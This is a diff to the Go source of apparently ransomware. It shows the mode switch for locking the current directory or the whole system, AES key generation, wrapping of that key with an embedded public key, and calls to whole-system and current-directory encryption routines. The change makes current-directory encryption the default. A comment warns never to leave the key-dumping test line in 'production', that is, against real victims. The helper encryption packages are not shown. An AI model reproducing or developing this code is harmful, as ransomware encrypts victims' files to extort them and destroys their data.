@@ -22,7 +22,7 @@ var pubKeyVar []byte
 var pl = fmt.Println
 
 var (
-	Mode            string = "lock"
+	Mode            string
 	encryptedAESKey []byte
 )
 
@@ -32,9 +32,9 @@ func main() {
 	case "decrypt":
 		ModeDecrypt()
 	case "lock":
-		ModeLockSystem()
+		// ModeLockSystem()
 	case "unlock system":
-		ModeUnlockSystem()
+		// ModeUnlockSystem()
 	default:
 		ModeLockCurrentDir()
 	}
@@ -70,6 +70,8 @@ func ModeDecrypt() {
 
 func ModeLockCurrentDir() {
 	key, encryptedAESKey := generateAesAndEncryptedAes()
+	// ! Uncomment this line only for testing. Never use this in production!
+	// os.WriteFile("decrypted.key", key, 0644)
 
 	file.RunEncryptForCurrentDir(encryptedAESKey, key)
 }
@@ -77,8 +79,7 @@ func ModeLockCurrentDir() {
 func ModeLockSystem() {
 	//encrypt aes key with public key
 	key, encryptedAESKey := generateAesAndEncryptedAes()
-	//! Uncomment this line only for testing. Never use this in production!
-	// os.WriteFile("decrypted.key", key, 0644)
+
 	system.WholeSystemEncrypt(key, encryptedAESKey)
 }
 
@@ -91,6 +92,7 @@ func generateAesAndEncryptedAes() ([]byte, []byte) {
 	publicKey := readPubKeyFromFileOrEmbedded()
 
 	encryptedAESKey = enc.EncryptWithPublicKey(key, enc.BytesToPublicKey(publicKey))
+
 	return key, encryptedAESKey
 }
 
